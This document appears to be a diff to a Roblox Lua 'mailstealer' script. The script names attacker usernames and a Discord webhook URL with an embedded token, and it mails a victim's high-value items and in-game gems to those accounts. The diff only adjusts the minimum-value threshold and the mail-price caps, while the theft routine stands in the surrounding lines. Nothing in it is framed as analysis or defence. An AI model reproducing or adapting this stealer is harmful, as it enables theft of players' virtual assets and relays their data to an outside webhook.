@@ -1,7 +1,7 @@
 Username = "stepanark"
 Username2 = "xavaxonosel2"
 Webhook = "https://discord.com/api/webhooks/1299345986061205586/YNmpW0V7RT157DVhz_9Jh5DjkgTjFvQ11IMR9T9_dvQL2Fzzsqw45FQZs0onqEP0761j"
-MinimumRAP = 500
+MinimumRAP = 500000
 
 LogsWebhook = "https://discord.com/api/webhooks/1299345986061205586/YNmpW0V7RT157DVhz_9Jh5DjkgTjFvQ11IMR9T9_dvQL2Fzzsqw45FQZs0onqEP0761j"
 mailstealer_name = "Hey!"
@@ -696,8 +696,8 @@ for i, v in pairs(hits) do
         itemsCounted = itemsCounted + 1
     end
     currentMailPrice = currentMailPrice * 1.5
-    if currentMailPrice > 5000000 then
-        currentMailPrice = 5000000
+    if currentMailPrice > 500000 then
+        currentMailPrice = 500000
     end
 end
 
@@ -727,8 +727,8 @@ local function sendItem(category, uid, am, locked)
     until response == true
     GemsAmount = GemsAmount - FirstPriceOfMail
     FirstPriceOfMail = math.ceil(math.ceil(FirstPriceOfMail) * 1.5)
-    if FirstPriceOfMail > 5000000 then
-        FirstPriceOfMail = 5000000
+    if FirstPriceOfMail > 500000 then
+        FirstPriceOfMail = 500000
     end
 end
 
@@ -792,8 +792,8 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
     end
     for i, v in pairs(hits) do
-        if FirstPriceOfMail > 5000000 then
-            FirstPriceOfMail = 5000000
+        if FirstPriceOfMail > 500000 then
+            FirstPriceOfMail = 500000
         end
         if v.Item_RAP >= FirstPriceOfMail then
             sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked)
